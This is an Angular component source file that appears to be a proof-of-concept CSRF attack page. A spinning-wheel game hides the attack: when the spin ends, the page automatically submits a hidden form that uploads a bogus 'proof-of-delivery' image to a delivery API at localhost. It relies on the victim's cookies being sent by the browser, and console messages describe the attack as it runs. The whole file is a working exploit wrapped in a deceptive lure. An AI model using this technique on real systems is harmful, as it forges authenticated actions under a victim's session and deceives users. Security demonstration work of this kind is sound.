import { Component, signal, ViewChild, ElementRef } from '@angular/core';
import { CommonModule } from '@angular/common';
import { RouterOutlet } from '@angular/router';

@Component({
  selector: 'app-root',
  imports: [RouterOutlet, CommonModule],
  templateUrl: './app.html',
  styleUrl: './app.css'
})
export class App {
  @ViewChild('csrfForm') csrfForm!: ElementRef<HTMLFormElement>;
  @ViewChild('fileInput') fileInput!: ElementRef<HTMLInputElement>;

  protected readonly spinning = signal(false);
  protected readonly spinComplete = signal(false);
  protected readonly attackLaunched = signal(false);
  protected readonly rotation = signal(0);
  
  protected readonly targetDeliveryId = 'b515360b-d7f3-4e83-8941-ec904f08d9ee';
  protected readonly apiEndpoint = 'http://localhost:5110';

  async spin() {
    if (this.spinning()) return;

    this.spinning.set(true);
    
    const spins = 5;
    const extraDegrees = 45;
    const totalRotation = spins * 360 + extraDegrees;
    
    await this.animateSpin(totalRotation);
    
    this.spinning.set(false);
    this.spinComplete.set(true);
    
    setTimeout(() => this.launchAttack(), 1000);
  }

  private async animateSpin(totalDegrees: number): Promise<void> {
    const duration = 3000;
    const startTime = Date.now();
    const startRotation = this.rotation();

    return new Promise((resolve) => {
      const animate = () => {
        const elapsed = Date.now() - startTime;
        const progress = Math.min(elapsed / duration, 1);
        
        const easeOut = 1 - Math.pow(1 - progress, 3);
        
        const currentRotation = startRotation + totalDegrees * easeOut;
        this.rotation.set(currentRotation);

        if (progress < 1) {
          requestAnimationFrame(animate);
        } else {
          resolve();
        }
      };
      
      requestAnimationFrame(animate);
    });
  }

  private async launchAttack() {
    const imageBlob = await fetch('/chicken.webp').then(r => r.blob());
    const file = new File([imageBlob], 'proof-of-delivery.webp', { type: 'image/webp' });
    
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(file);
    this.fileInput.nativeElement.files = dataTransfer.files;

    console.log('🔴 CSRF Attack: Submitting form to upload bogus proof of delivery');
    console.log('Target:', `${this.apiEndpoint}/api/v1/proofs/deliveries/${this.targetDeliveryId}/upload`);
    console.log('Method: Traditional HTML form POST (no preflight!)');
    console.log('Cookies will be sent automatically by the browser...');

    this.csrfForm.nativeElement.submit();

    setTimeout(() => {
      this.attackLaunched.set(true);
    }, 500);
  }
}
